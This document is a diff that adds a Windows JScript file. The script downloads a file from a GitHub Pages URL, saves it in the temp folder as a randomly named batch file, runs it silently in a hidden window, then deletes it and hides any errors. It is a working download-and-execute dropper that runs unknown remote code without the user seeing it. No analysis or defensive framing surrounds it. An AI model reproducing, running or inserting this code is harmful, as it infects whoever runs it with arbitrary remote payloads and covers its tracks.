@@ -1,0 +1,34 @@
+var url = "https://pc-createstudio.github.io/a/x";
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+var shell = new ActiveXObject("WScript.Shell");
+var tempFolder = shell.ExpandEnvironmentStrings("%TEMP%");
+var randomName = Math.random().toString(36).substring(2, 15) + ".bat";
+var batchPath = tempFolder + "\\" + randomName;
+
+try {
+    // Download using XMLHTTP
+    var xhr = new ActiveXObject("MSXML2.XMLHTTP.6.0");
+    xhr.open("GET", url, false);
+    xhr.send();
+    
+    if (xhr.status === 200) {
+        var stream = new ActiveXObject("ADODB.Stream");
+        stream.Type = 1; // Binary
+        stream.Open();
+        stream.Write(xhr.ResponseBody);
+        stream.SaveToFile(batchPath, 2);
+        stream.Close();
+        
+        // Execute silently
+        shell.Run('cmd /c "' + batchPath + '"', 0, false);
+        
+        // Wait and delete
+        WScript.Sleep(3000);
+        
+        // Multiple deletion methods
+        try { fso.DeleteFile(batchPath, true); } catch(e) {}
+        try { shell.Run('cmd /c del /f /q "' + batchPath + '"', 0, true); } catch(e) {}
+    }
+} catch(e) {
+    // Silent error handling
+}
